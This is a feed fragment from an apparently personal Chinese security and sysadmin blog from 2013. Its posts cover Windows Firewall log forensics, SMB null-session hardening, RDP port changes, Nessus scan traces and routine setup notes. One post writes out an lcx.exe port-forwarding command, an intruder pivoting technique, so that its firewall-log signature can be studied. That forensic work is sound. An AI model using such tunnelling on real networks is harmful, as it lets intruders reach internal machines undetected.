                <description>&lt;p&gt;原来一直以为win的防火墙只有打开跟关闭这一个可以配置的地方.仔细看了下.原来可以配置例外,设置生效的网卡,记录日志等.&lt;/p&gt;

&lt;p&gt;&lt;img alt='winfirewall' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/winfirewall.png' /&gt;&lt;/p&gt;

&lt;p&gt;防火墙的日志格式如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Version: 1.5
Software: Microsoft Windows Firewall
Time Format: Local
Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;样例:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;08-15 23:26:18 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE
2013-08-15 23:26:21 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE
2013-08-15 23:26:40 OPEN UDP 192.168.31.205 8.8.8.8 1062 53 - - - - - - - - -
2013-08-15 23:26:40 OPEN TCP 192.168.31.205 50.31.149.100 1866 443 - - - - - - - - -
2013-08-15 23:26:41 CLOSE TCP 192.168.31.205 50.31.149.100 1866 443 - - - - - - - - -
2013-08-15 23:26:45 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE
2013-08-15 23:26:45 DROP UDP 192.168.31.22 192.168.31.255 137 137 78 - - - - - - - RECEIVE
2013-08-15 23:26:46 DROP UDP 192.168.31.22 192.168.31.255 137 137 78 - - - - - - - RECEIVE&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还是包含了不少信息的.&lt;/p&gt;

&lt;h2 id='id2560'&gt;华丽的分割线&lt;/h2&gt;

&lt;p&gt;说起windows的日志,大家最熟悉的就是系统日志了,网上也有很多现成的工具来清除windows的系统事件.而对于windows系统防火墙的日志,可能都没怎么重视.也没有发现有专门清除防火墙日志的工具,虽然它只是一个txt文件.&lt;/p&gt;

&lt;p&gt;本文将简单介绍一下windows自带防火墙的日志格式,通过实际案例(3389远程桌面和lcx转发内网端口),来 说明通过防火墙日志分析入侵痕迹的方式.&lt;/p&gt;

&lt;p&gt;防火墙的配置跟大多数防火墙类似,就不赘述了.默认情况下,防火墙的日志文件位于:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\windows\pfirewall.log&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;日志每个字段的含义如下,在pfirewall.log最开始有注释.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#Version: 1.5 
#Software: Microsoft Windows Firewall 
#Time Format: Local 
#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path
2013-08-22 14:58:57 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE 
2013-08-22 14:59:00 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE 
2013-08-22 14:59:03 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE 
2013-08-22 14:59:26 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE 
2013-08-22 14:59:29 DROP UDP 0.0.0.0 255.255.255.255 68 67 576 - - - - - - - RECEIVE&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id='3389'&gt;一次3389连接的日志&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;2013-08-26 19:00:44 OPEN-INBOUND TCP 192.168.10.16 192.168.31.205 53907 3389 - - - - - - - - -
2013-08-26 19:00:44 CLOSE TCP 192.168.31.205 192.168.10.16 3389 53907 - - - - - - - - -&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;都懂,ip在那摆着&amp;#8230;.&lt;/p&gt;

&lt;h2 id='lcx'&gt;lcx转发内网端口的日志&lt;/h2&gt;

&lt;p&gt;lcx转发内网端口:192.168.31.205上执行 lcx.exe -slave 192.168.31.201 2222 192.168.31.110 3389&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2013-08-26 19:34:29 OPEN TCP 192.168.31.205 192.168.31.201 2328 2222 - - - - - - - - -
2013-08-26 19:34:49 OPEN TCP 192.168.31.205 192.168.31.110 2329 3389 - - - - - - - - -
2013-08-26 19:34:50 OPEN TCP 192.168.31.205 192.168.31.201 2330 2222 - - - - - - - - -
2013-08-26 19:35:12 CLOSE TCP 192.168.31.205 192.168.31.110 2329 3389 - - - - - - - - -
2013-08-26 19:35:12 CLOSE TCP 192.168.31.205 192.168.31.201 2328 2222 - - - - - - - - -
2013-08-26 19:35:17 CLOSE TCP 192.168.31.205 192.168.31.201 2330 2222 - - - - - - - - -
2013-08-26 19:35:17 OPEN TCP 192.168.31.205 192.168.31.201 2331 2222 - - - - - - - - -
2013-08-26 19:35:18 CLOSE TCP 192.168.31.205 192.168.31.201 2331 2222 - - - - - - - - -
2013-08-26 19:35:18 OPEN TCP 192.168.31.205 192.168.31.201 2332 2222 - - - - - - - - -
2013-08-26 19:35:19 CLOSE TCP 192.168.31.205 192.168.31.201 2332 2222 - - - - - - - - -
2013-08-26 19:35:19 OPEN TCP 192.168.31.205 192.168.31.201 2333 2222 - - - - - - - - -
2013-08-26 19:35:20 CLOSE TCP 192.168.31.205 192.168.31.201 2333 2222 - - - - - - - - -&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;日志处理过,把中间一些其他无关的给过滤掉了.可以看到特征还是很明显的. 会有两个连接到201的2222端口.有一个连接到110的3389端口,刚好夹在两个到2222端口的连接之间.从205的本地端口号可以很清晰的判断(2328,2329,2330). 后面几行到201的2222端口,不断打开关闭是由于先结束掉了201上监听的lcx进程.这个特征也很明显.可以基于这些来判断端口被转发到的目的地址.&lt;/p&gt;

&lt;p&gt;lcx转发本地端口:192.168.31.205上执行 lcx.exe -slave 192.168.31.201 2222 127.0.0.1 3389&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2013-08-26 19:38:37 OPEN TCP 192.168.31.205 192.168.31.201 2342 2222 - - - - - - - - -
2013-08-26 19:39:01 OPEN TCP 192.168.31.205 192.168.31.201 2344 2222 - - - - - - - - -
2013-08-26 19:39:18 CLOSE TCP 192.168.31.205 192.168.31.201 2342 2222 - - - - - - - - -
2013-08-26 19:39:22 CLOSE TCP 192.168.31.205 192.168.31.201 2344 2222 - - - - - - - - -
2013-08-26 19:39:22 OPEN TCP 192.168.31.205 192.168.31.201 2345 2222 - - - - - - - - -
2013-08-26 19:39:23 CLOSE TCP 192.168.31.205 192.168.31.201 2345 2222 - - - - - - - - -
2013-08-26 19:39:23 OPEN TCP 192.168.31.205 192.168.31.201 2346 2222 - - - - - - - - -
2013-08-26 19:39:24 CLOSE TCP 192.168.31.205 192.168.31.201 2346 2222 - - - - - - - - -
2013-08-26 19:39:24 OPEN TCP 192.168.31.205 192.168.31.201 2347 2222 - - - - - - - - -
2013-08-26 19:39:25 CLOSE TCP 192.168.31.205 192.168.31.201 2347 2222 - - - - - - - - -
2013-08-26 19:39:25 OPEN TCP 192.168.31.205 192.168.31.201 2348 2222 - - - - - - - - -
2013-08-26 19:39:26 CLOSE TCP 192.168.31.205 192.168.31.201 2348 2222 - - - - - - - - -
2013-08-26 19:39:26 OPEN TCP 192.168.31.205 192.168.31.201 2349 2222 - - - - - - - - -
2013-08-26 19:39:27 CLOSE TCP 192.168.31.205 192.168.31.201 2349 2222 - - - - - - - - -&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样,根据第一个案例,可以推断出.205上应该open3个连接.2个到201的2222端口.一个到127.0.0.1的3389端口.从日志中我们只看到了 到201的2222端口,不过从端口号上可以看出,从2342到2344,中间的2343应该是被占用了.只是到127.0.0.1的3389端口,流量没有通过防火墙,没有被记录下来.&lt;/p&gt;

&lt;p&gt;从上面的分析可以看出.windows的自带的防火墙在日志分析,IP追踪方面还是有一些作用的.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/08/16/windows</link>
                <guid>http://username.github.io/技术研究/2013/08/16/windows</guid>
                <pubDate>2013-08-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>log parser 使用记录</title>
                <description></description>
                <link>http://username.github.io/工具使用/2013/08/16/log-parser-</link>
                <guid>http://username.github.io/工具使用/2013/08/16/log-parser-</guid>
                <pubDate>2013-08-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu 12.04升级ruby</title>
                <description>&lt;p&gt;虽然不会ruby,但是想要把一个ruby脚本修改一下自己用.刚运行就报错 没有sample方法,搜了下说是ruby1.8的问题.看了下,ubuntu默认果然是1.8.于是需要升级.&lt;/p&gt;

&lt;p&gt;升级自然有两种方式apt-get和源码安装一开始觉得源码太麻烦了.所以用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get upgrade ruby&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;装完之后发现ruby -v 还是1.8.参考这里&lt;a href='http://geekpi.cn/blog/2013/01/2252'&gt;ruby升级遭遇的麻烦–ubuntu探索之旅&lt;/a&gt;发现rvm安装一直host超时,估计被墙了.然后使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;update-alternatives --config ruby/gem&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;来选择ruby的版本.只有1.9.1,发现依然会报找不到方法的异常.没有办法只有源码安装.&lt;/p&gt;

&lt;h2 id='ruby'&gt;源码安装ruby&lt;/h2&gt;

&lt;p&gt;ruby源码下载地址&lt;a href='http://www.ruby-lang.org/en/downloads/'&gt;源码下载&lt;/a&gt; 安装步骤如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#解压文件  
tar vfxz ruby-1.9.1-p0.tar.gz  
  
#进入解压后的文件夹  
cd ruby-1.9.1-p0/  
  
#编译源码,在编译之前,应该先对/usr/local/ruby-1.9.1文件夹设置权限.  
./configure --prefix=/usr/local/ruby-1.9.1  
  
#大名鼎鼎的 make 和 install  
make &amp;amp;&amp;amp; make install  
  
#设置PATH路径,把自己安装的ruby放在系统PATH前面，避免调用操作系统自带的ruby  
export PATH=/usr/local/ruby-1.9.1/bin:$PATH  
#我在 ~/.profile 文件中增加了这样的代码:  
if [ -d &amp;quot;/usr/local/ruby-1.9.1/bin&amp;quot; ] ; then  
    PATH=&amp;quot;/usr/local/ruby-1.9.1/bin:$PATH&amp;quot;  
fi  
然后 注销 再登陆一次.  
  
#如无意外  
  
ruby -v  
#ruby 1.9.1p0 (2009-01-30 revision 21907) [i686-linux]  
  
#ruby 1.9.1安装成功了.&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/代码人生/2013/08/15/ubuntu-1204ruby</link>
                <guid>http://username.github.io/代码人生/2013/08/15/ubuntu-1204ruby</guid>
                <pubDate>2013-08-15T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows 大量538 540事件</title>
                <description>&lt;p&gt;来源于之前写过的nessus扫描痕迹的研究.发现有些系统没有产生相关的日志.而当时测试的windows存在多个漏洞.怀疑日志的产生是否跟漏洞有关.所以全面升级了补丁,又测试发现依然会产生日志.然后想定位到到底是nessus的哪个插件,windows的哪个服务导致产生了日志.经过多次测试,终于找到了产生日志的来源.原来是开启lanmanserver服务的原因.测试的方式是在msconfig系统配置实用程序中,关闭所有服务和启动项,对比前后两次nessus扫描报告的不同点,定位到是smb相关的服务.&lt;/p&gt;

&lt;p&gt;然后查资料得知是lanmanserver的服务.显示名称是server.正是这个服务产生的538 540的事件.查资料的时候发现,很多别的服务比如iis也可能产生这种事件.这里的登录成功并不是操作系统被他人登录.&lt;/p&gt;

&lt;h1 id='smb'&gt;smb相关参考资料&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://baike.baidu.com/view/262410.htm'&gt;smb百度百科&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.tomshardware.com/forum/135984-45-anon-logon-events'&gt;Anon Logon Events 538/540&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://social.technet.microsoft.com/Forums/windowsserver/en-US/7d4c75d6-ece7-45da-8f78-df88939ffd30/multiple-security-events-ids-538-540'&gt;Multiple Security Events ID&amp;#8217;s 538 &amp;amp; 540&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://forums.asp.net/t/1415942.aspx'&gt;Multiple 540 and 538 logon logoff event IDs caused by web application&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/08/14/windows-538-540</link>
                <guid>http://username.github.io/技术研究/2013/08/14/windows-538-540</guid>
                <pubDate>2013-08-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows日志相关设置</title>
                <description></description>
                <link>http://username.github.io/2013/08/14/windows</link>
                <guid>http://username.github.io/2013/08/14/windows</guid>
                <pubDate>2013-08-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>snmp监控iis并发链接数</title>
                <description>&lt;p&gt;windows开启snmp服务,在添加组件的地方添加就可以.然后配置团体字是在服务管理里面.snmp服务的安全选项卡里.&lt;/p&gt;

&lt;p&gt;iis的相关oid如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TotalBytesSent_HighWord 	1.3.6.1.4.1.311.1.7.3.1.1.0
TotalBytesSent_LowWord 	1.3.6.1.4.1.311.1.7.3.1.2.0
TotalBytesReceived_HighWord 	1.3.6.1.4.1.311.1.7.3.1.3.0
TotalBytesReceived_LowWord 	1.3.6.1.4.1.311.1.7.3.1.4.0
TotalFilesSent 	1.3.6.1.4.1.311.1.7.3.1.5.0
TotalFilesReceived 	1.3.6.1.4.1.311.1.7.3.1.6.0
CurrentAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.7.0
CurrentNonAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.8.0
TotalAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.9.0
TotalNonAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.10.0
MaxAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.11.0
MaxNonAnonymousUsers 	1.3.6.1.4.1.311.1.7.3.1.12.0
CurrentConnections 	1.3.6.1.4.1.311.1.7.3.1.13.0
MaxConnections 	1.3.6.1.4.1.311.1.7.3.1.14.0
ConnectionAttempts 	1.3.6.1.4.1.311.1.7.3.1.15.0
LogonAttempts 	1.3.6.1.4.1.311.1.7.3.1.16.0
TotalOptions 	1.3.6.1.4.1.311.1.7.3.1.17.0
TotalGets 	1.3.6.1.4.1.311.1.7.3.1.18.0
TotalPosts 	1.3.6.1.4.1.311.1.7.3.1.19.0
TotalHeads 	1.3.6.1.4.1.311.1.7.3.1.20.0
TotalPuts 	1.3.6.1.4.1.311.1.7.3.1.21.0
TotalDeletes 	1.3.6.1.4.1.311.1.7.3.1.22.0
TotalTraces 	1.3.6.1.4.1.311.1.7.3.1.23.0
TotalMove 	1.3.6.1.4.1.311.1.7.3.1.24.0
TotalCopy 	1.3.6.1.4.1.311.1.7.3.1.25.0
TotalMkcol 	1.3.6.1.4.1.311.1.7.3.1.26.0
TotalPropfind 	1.3.6.1.4.1.311.1.7.3.1.27.0
TotalProppatch 	1.3.6.1.4.1.311.1.7.3.1.28.0
TotalSearch 	1.3.6.1.4.1.311.1.7.3.1.29.0
TotalLock 	1.3.6.1.4.1.311.1.7.3.1.30.0
TotalUnlock 	1.3.6.1.4.1.311.1.7.3.1.31.0
TotalOthers 	1.3.6.1.4.1.311.1.7.3.1.32.0
CurrentCGIRequests 	1.3.6.1.4.1.311.1.7.3.1.33.0
CurrentBGIRequests 	1.3.6.1.4.1.311.1.7.3.1.34.0
TotalCGIRequests 	1.3.6.1.4.1.311.1.7.3.1.35.0
TotalBGIRequests 	1.3.6.1.4.1.311.1.7.3.1.36.0
MaxCGIRequests 	1.3.6.1.4.1.311.1.7.3.1.37.0
MaxBGIRequests 	1.3.6.1.4.1.311.1.7.3.1.38.0
CurrentBlockedRequests 	1.3.6.1.4.1.311.1.7.3.1.39.0
TotalBlockedRequests 	1.3.6.1.4.1.311.1.7.3.1.40.0
TotalAllowedRequests 	1.3.6.1.4.1.311.1.7.3.1.41.0
TotalRejectedRequests 	1.3.6.1.4.1.311.1.7.3.1.42.0
TotalNotFoundErrors 	1.3.6.1.4.1.311.1.7.3.1.43.0
TotalLockedErrors 	1.3.6.1.4.1.311.1.7.3.1.44.0
MeasuredBandwidth 	1.3.6.1.4.1.311.1.7.3.1.45.0
CurrentCalAuth 	1.3.6.1.4.1.311.1.7.3.1.46.0
MaxCalAuth 	1.3.6.1.4.1.311.1.7.3.1.47.0
TotalFailedCalAuth 	1.3.6.1.4.1.311.1.7.3.1.48.0
CurrentCalSsl 	1.3.6.1.4.1.311.1.7.3.1.49.0
MaxCalSsl 	1.3.6.1.4.1.311.1.7.3.1.50.0
TotalFailedCalSsl 	1.3.6.1.4.1.311.1.7.3.1.51.0&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2559'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.grandcloud.cn/help/detail/553'&gt;Windows下如何启用snmp服务&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blogs.msdn.com/b/vijaysk/archive/2010/01/28/mib-oids-for-iis-6-0.aspx'&gt;iis oid&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/08/14/snmpiis</link>
                <guid>http://username.github.io/技术研究/2013/08/14/snmpiis</guid>
                <pubDate>2013-08-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>smb null session authentication</title>
                <description>&lt;p&gt;还是在纠结windows产生的日志的问题,在逐条排除,看看是哪个服务产生的日志.&lt;/p&gt;

&lt;p&gt;&lt;img alt='nessus报告' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/smbnull.png' /&gt;&lt;/p&gt;

&lt;p&gt;根据报告中提到的方法操作,就可以关闭smb null session authentication.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Set :  - HKLM\SYSTEM\CurrentControlSet\Control\LSA\RestrictAnonymous=1
- HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\restrictnullsessaccess=1
Remove BROWSER from :
- HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\NullSessionPipes&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reboot once the registry changes are complete.&lt;/p&gt;

&lt;p&gt;设置和删除两个操作.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/14/smb-null-session-authentication</link>
                <guid>http://username.github.io/2013/08/14/smb-null-session-authentication</guid>
                <pubDate>2013-08-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>python多线程(python核心编程读书笔记)</title>
                <description></description>
                <link>http://username.github.io/技术研究/2013/08/14/pythonpython</link>
                <guid>http://username.github.io/技术研究/2013/08/14/pythonpython</guid>
                <pubDate>2013-08-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>win2003 远程桌面配置</title>
                <description>&lt;h2 id='3389'&gt;更改3389端口&lt;/h2&gt;

&lt;p&gt;注意需要改两个地方.&lt;/p&gt;

&lt;p&gt;打开“开始→运行”，输入“regedit”，打开注册表，进入以下路径：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]，&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看见PortNamber值了吗？其默认值是：0xd3d，这个是16进制，点击右边的十进制，显示的就是3389了，修改成所希望的端口即可，例如6111。&lt;/p&gt;

&lt;p&gt;再打开&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HKEY_LOCAL_MACHINE\SYSTEM\CurrentContro1Set\Control\Tenninal Server\WinStations\RDP-Tcp]，&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将PortNumber的值（也是3389）修改成端口6111。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/13/win2003-</link>
                <guid>http://username.github.io/2013/08/13/win2003-</guid>
                <pubDate>2013-08-13T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>python基本语法速查</title>
                <description>&lt;h2 id='id2558'&gt;相关资料&lt;/h2&gt;

&lt;p&gt;python&lt;a href='http://sebug.net/paper/python/index.html'&gt;简明教程&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/编程语言/2013/08/10/python</link>
                <guid>http://username.github.io/编程语言/2013/08/10/python</guid>
                <pubDate>2013-08-10T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>github操作手册</title>
                <description>&lt;h1 id='id2555'&gt;删除一个仓库&lt;/h1&gt;

&lt;p&gt;右侧 setting 里面。&lt;/p&gt;

&lt;h1 id='id2556'&gt;撤销上一次的提交&lt;/h1&gt;

&lt;p&gt;http://stackoverflow.com/questions/448919/how-can-i-remove-a-commit-on-github&lt;/p&gt;

&lt;p&gt;http://mynoteweb.com/node/13348&lt;/p&gt;

&lt;p&gt;首先在本地撤销。输入下面的命令，在编辑界面删除第2行文字：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ git rebase -i HEAD~2
Successfully rebased and updated refs/heads/master.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后撤销服务器上的提交：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ git push origin +master&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2557'&gt;安装&lt;/h2&gt;

&lt;p&gt;ubuntu 使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install git-core&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;centos 安装&lt;/p&gt;

&lt;p&gt;centos6 以前的yum源中没有git,只有通过源码的方式安装.参考&lt;a href='http://www.ccvita.com/370.html'&gt;centos安装git&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;遇到一个错误,fatal: Unable to find remote helper for &amp;#8216;https&amp;#8217; .原来是一开始的依赖包没有装全.重新j编译一下搞定.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install curl
yum install curl-devel
yum install zlib-devel
yum install openssl-devel
yum install perl
yum install cpio
yum install expat-devel
yum install gettext-devel
yum install autoconf

wget http://www.codemonkey.org.uk/projects/git-snapshots/git/git-latest.tar.gz
tar xzvf git-latest.tar.gz
cd git-2011-11-30 ＃你的目录可能不是这个
autoconf
./configure
make
sudo make install&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/10/github</link>
                <guid>http://username.github.io/工具使用/2013/08/10/github</guid>
                <pubDate>2013-08-10T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows命令行用户管理</title>
                <description>&lt;p&gt;添加用户&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net user 帐户  密码 /add&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提升普通用户为管理员&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net localgroup administrators 帐户 /add&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;更改账户密码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net user  帐户  密码&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;删除帐户&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net user 帐户 /del&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/08/09/windows</link>
                <guid>http://username.github.io/2013/08/09/windows</guid>
                <pubDate>2013-08-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>vi操作速查</title>
                <description></description>
                <link>http://username.github.io/2013/08/09/vi</link>
                <guid>http://username.github.io/2013/08/09/vi</guid>
                <pubDate>2013-08-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>nessus扫描痕迹测试</title>
                <description>&lt;h2 id='linux'&gt;linux&lt;/h2&gt;

&lt;p&gt;测试方法：被扫描linux上用inotifywait监控/var/log/目录的文件系统变更。&lt;/p&gt;

&lt;p&gt;测试环境:nessus 5.2.1 homefeed ip:192.168.31.200 nessus配置为默认配置，policies选用internal network scan&lt;/p&gt;

&lt;p&gt;被扫描服务器为centos 5.4 ip:192.168.31.104 syslog配置为默认配置&lt;/p&gt;

&lt;p&gt;扫描开始时间：14：06：04 结束时间14：16：44 扫描结果都是info级别的，没有发现漏洞。&lt;/p&gt;

&lt;p&gt;文件检测显示共有378条文件变更记录。如下3种：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/var/log/audit/ MODIFY audit.log
/var/log/ MODIFY secure
/var/log/ MODIFY btmp&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='auditlog_'&gt;audit.log 样例#：是认证用户登录失败相关的信息。&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;15777 type=USER_AUTH msg=audit(1376028497.065:189): user pid=7158 uid=0 auid=4294967295 msg=&amp;#39;PAM: authentication acct=&amp;quot;?&amp;quot; : exe=&amp;quot;/usr/sbin/sshd&amp;quot; (hostname=192.168.31.200, addr=192.168.31.200, terminal=ssh res=failed)&amp;#39;
15778 type=USER_LOGIN msg=audit(1376028497.065:190): user pid=7158 uid=0 auid=4294967295 msg=&amp;#39;acct=&amp;quot;n3ssus&amp;quot;: exe=&amp;quot;/usr/sbin/sshd&amp;quot; (hostname=?, addr=192.168.31.200, terminal=sshd res=failed)&amp;#39;
15779 type=USER_AUTH msg=audit(1376028497.591:191): user pid=7170 uid=0 auid=4294967295 msg=&amp;#39;PAM: authentication acct=&amp;quot;?&amp;quot; : exe=&amp;quot;/usr/sbin/sshd&amp;quot; (hostname=192.168.31.200, addr=192.168.31.200, terminal=ssh res=failed)&amp;#39;
15780 type=USER_LOGIN msg=audit(1376028497.591:192): user pid=7168 uid=0 auid=4294967295 msg=&amp;#39;acct=&amp;quot;emailswitch&amp;quot;: exe=&amp;quot;/usr/sbin/sshd&amp;quot; (hostname=?, addr=192.168.31.200, terminal=sshd res=failed)&amp;#39;
15781 type=USER_AUTH msg=audit(1376028498.706:193): user pid=7163 uid=0 auid=4294967295 msg=&amp;#39;PAM: authentication acct=&amp;quot;?&amp;quot; : exe=&amp;quot;/usr/sbin/sshd&amp;quot; (hostname=192.168.31.200, addr=192.168.31.200, terminal=ssh res=failed)&amp;#39;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='secure_'&gt;secure样例 #用户尝试登录的错误信息&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;Aug  9 14:08:27 localhost sshd[7221]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.31.200
Aug  9 14:08:27 localhost sshd[7221]: pam_succeed_if(sshd:auth): error retrieving information about user manage
Aug  9 14:08:29 localhost sshd[7208]: Failed password for root from 192.168.31.200 port 3592 ssh2
Aug  9 14:08:29 localhost sshd[7206]: Failed password for root from 192.168.31.200 port 3591 ssh2
Aug  9 14:08:29 localhost sshd[7209]: fatal: Read from socket failed: Connection reset by peer
Aug  9 14:08:29 localhost sshd[7207]: fatal: Read from socket failed: Connection reset by peer
Aug  9 14:08:29 localhost sshd[7226]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.31.200  user=root
Aug  9 14:08:29 localhost sshd[7225]: fatal: Read from socket failed: Connection reset by peer
Aug  9 14:08:29 localhost sshd[7213]: error: PAM: Authentication failure for root from 192.168.31.200
Aug  9 14:08:29 localhost sshd[7213]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.31.200  user=root
Aug  9 14:08:29 localhost sshd[7215]: error: PAM: User not known to the underlying authentication module for illegal user admin from 192.168.31.200
Aug  9 14:08:29 localhost sshd[7215]: Failed keyboard-interactive/pam for invalid user admin from 192.168.31.200 port 3594 ssh2
Aug  9 14:08:29 localhost sshd[7215]: pam_unix(sshd:auth): check pass; user unknown
Aug  9 14:08:29 localhost sshd[7215]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.31.200
Aug  9 14:08:29 localhost sshd[7215]: pam_succeed_if(sshd:auth): error retrieving information about user admin&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='btmp'&gt;btmp&lt;/h1&gt;

&lt;p&gt;btmp是一个2进制文件，记录用户失败的登录尝试。&lt;/p&gt;

&lt;p&gt;可以用 last -f /var/log/btmp 命令查看内容。&lt;/p&gt;

&lt;h1 id='so'&gt;so&lt;/h1&gt;

&lt;p&gt;对于没有漏洞，开放了一些端口的情况下，比如22端口。是会记录尝试弱密码的一些相关操作的。&lt;/p&gt;

&lt;p&gt;如果主机开放了其他端口，或者存在一些漏洞，应该也是可以产生一些其他类型的日志的。这种情况过于复杂，赞未测试。&lt;/p&gt;

&lt;h2 id='windows'&gt;windows&lt;/h2&gt;

&lt;p&gt;被测试系统:windows 2003 企业版 SP2 日志相关策略为默认。&lt;/p&gt;

&lt;p&gt;扫描前日志查看器最新日志时间：应用程序，23：07：32 安全行，23：12：24 系统，23：18：00&lt;/p&gt;

&lt;p&gt;扫描结果：存在高危漏洞。 &lt;img alt='log' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/win5.png' /&gt;&lt;/p&gt;

&lt;p&gt;应用程序没有产生 新的日志。&lt;/p&gt;

&lt;p&gt;安全性产生了大量538 540的日志（几十条）&lt;/p&gt;

&lt;p&gt;&lt;img alt='log' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/win1.png' /&gt; &lt;img alt='log' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/win2.png' /&gt;&lt;/p&gt;

&lt;p&gt;系统产生了两条日志。&lt;/p&gt;

